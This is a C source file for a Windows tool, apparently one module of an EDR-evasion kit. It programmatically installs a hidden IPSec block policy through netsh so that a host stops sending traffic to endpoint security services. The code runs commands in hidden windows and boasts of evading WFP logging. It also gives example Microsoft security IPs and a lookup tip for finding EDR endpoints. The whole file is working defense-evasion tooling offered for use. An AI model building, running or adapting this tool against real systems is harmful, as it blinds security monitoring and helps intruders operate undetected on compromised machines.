/*
 * 06_ipsec_block.c
 * IPSec Filter Rules — block EDR traffic using Windows IPSec policy engine
 *
 * IPSec filters block traffic independently of WFP.
 * No Event 5447 (WFP) generated. IPSec uses its own policy engine (ipsec.sys).
 *
 * Implements the netsh ipsec static commands programmatically via
 * Windows' built-in IPSec Management API (mprapi/ipsecpol).
 *
 * Build:
 *   cl 06_ipsec_block.c /link Advapi32.lib
 *
 * Usage:
 *   06_ipsec_block.exe install  <ip1> [ip2] [ip3] ...
 *   06_ipsec_block.exe remove
 *
 * Note: Also works via batch / netsh commands (embedded below as fallback).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

#define POLICY_NAME    L"EDRBlockPolicy"
#define FILTERLIST_NAME L"EDRFilterList"
#define FILTERACTION_NAME L"EDRBlockAction"
#define RULE_NAME      L"EDRBlockRule"

/*
 * Execute a command silently and return exit code.
 * Uses CreateProcess so we can capture the output if needed.
 */
static DWORD RunCmd(const WCHAR *cmd)
{
    WCHAR cmdBuf[2048] = {0};
    _snwprintf_s(cmdBuf, ARRAYSIZE(cmdBuf), _TRUNCATE, L"cmd.exe /c %s", cmd);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags    = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, cmdBuf, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return GetLastError();
    }

    WaitForSingleObject(pi.hProcess, 10000);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return exitCode;
}

/* Build a netsh ipsec command and run it */
static BOOL NetshIpsec(const WCHAR *args)
{
    WCHAR cmd[1024] = {0};
    _snwprintf_s(cmd, ARRAYSIZE(cmd), _TRUNCATE,
                 L"netsh ipsec static %s", args);
    wprintf(L"  netsh ipsec static %s\n", args);
    return RunCmd(cmd) == 0;
}

static BOOL InstallIpsecPolicy(const WCHAR **ips, int ipCount)
{
    BOOL ok = TRUE;

    /* 1. Delete existing policy with same name (cleanup) */
    NetshIpsec(L"delete policy name=" POLICY_NAME);

    /* 2. Create policy */
    wprintf(L"[*] Creating IPSec policy...\n");
    ok &= NetshIpsec(L"add policy name=" POLICY_NAME
                     L" description=\"EDR network block\"");

    /* 3. Create filter list */
    ok &= NetshIpsec(L"add filterlist name=" FILTERLIST_NAME);

    /* 4. Add filters for each IP */
    for (int i = 0; i < ipCount; i++) {
        WCHAR filterCmd[512] = {0};
        _snwprintf_s(filterCmd, ARRAYSIZE(filterCmd), _TRUNCATE,
                     L"add filter filterlist=" FILTERLIST_NAME
                     L" srcaddr=me dstaddr=%s protocol=any", ips[i]);
        wprintf(L"  [+] Adding filter for: %s\n", ips[i]);
        ok &= NetshIpsec(filterCmd);
    }

    /* 5. Create block action */
    ok &= NetshIpsec(L"add filteraction name=" FILTERACTION_NAME
                     L" action=block");

    /* 6. Create rule linking policy + filterlist + action */
    ok &= NetshIpsec(L"add rule name=" RULE_NAME
                     L" policy=" POLICY_NAME
                     L" filterlist=" FILTERLIST_NAME
                     L" filteraction=" FILTERACTION_NAME);

    /* 7. Activate the policy */
    wprintf(L"[*] Activating policy...\n");
    ok &= NetshIpsec(L"set policy name=" POLICY_NAME L" assign=y");

    return ok;
}

static BOOL RemoveIpsecPolicy(void)
{
    wprintf(L"[*] Removing IPSec policy...\n");
    /* Deactivate first */
    NetshIpsec(L"set policy name=" POLICY_NAME L" assign=n");
    /* Delete policy (cascades to rules) */
    NetshIpsec(L"delete policy name=" POLICY_NAME);
    /* Delete filter list */
    NetshIpsec(L"delete filterlist name=" FILTERLIST_NAME);
    /* Delete filter action */
    NetshIpsec(L"delete filteraction name=" FILTERACTION_NAME);
    wprintf(L"[+] IPSec policy removed.\n");
    return TRUE;
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] IPSec Block Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s install <ip1> [ip2] ...   Block specific IPs via IPSec\n", argv[0]);
        wprintf(L"  %s remove                    Remove IPSec policy\n", argv[0]);
        wprintf(L"\nExample:\n");
        wprintf(L"  %s install 52.168.138.249 13.107.246.10\n", argv[0]);
        wprintf(L"\nTip: To find EDR IPs first (before NRPT sinkhole is active):\n");
        wprintf(L"  nslookup endpoint.security.microsoft.com\n");
        return 1;
    }

    if (_wcsicmp(argv[1], L"remove") == 0) {
        RemoveIpsecPolicy();
        return 0;
    }

    if (_wcsicmp(argv[1], L"install") == 0) {
        if (argc < 3) {
            wprintf(L"[-] No IPs specified. Provide at least one IP address.\n");
            return 1;
        }

        const WCHAR **ips = (const WCHAR **)(argv + 2);
        int ipCount = argc - 2;

        wprintf(L"[*] Installing IPSec block for %d IP(s):\n", ipCount);
        for (int i = 0; i < ipCount; i++) {
            wprintf(L"    %s\n", ips[i]);
        }
        wprintf(L"\n");

        if (!InstallIpsecPolicy(ips, ipCount)) {
            wprintf(L"[-] IPSec policy installation encountered errors.\n");
            wprintf(L"[-] Make sure you are running as Administrator.\n");
            return 1;
        }

        wprintf(L"\n[+] IPSec policy active. Target IPs are now blocked.\n");
        wprintf(L"[+] No WFP events generated — transparent to WFP monitoring.\n");
        wprintf(L"[*] Detection: Windows Events 5460/5471 (if IPSec auditing enabled)\n");
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
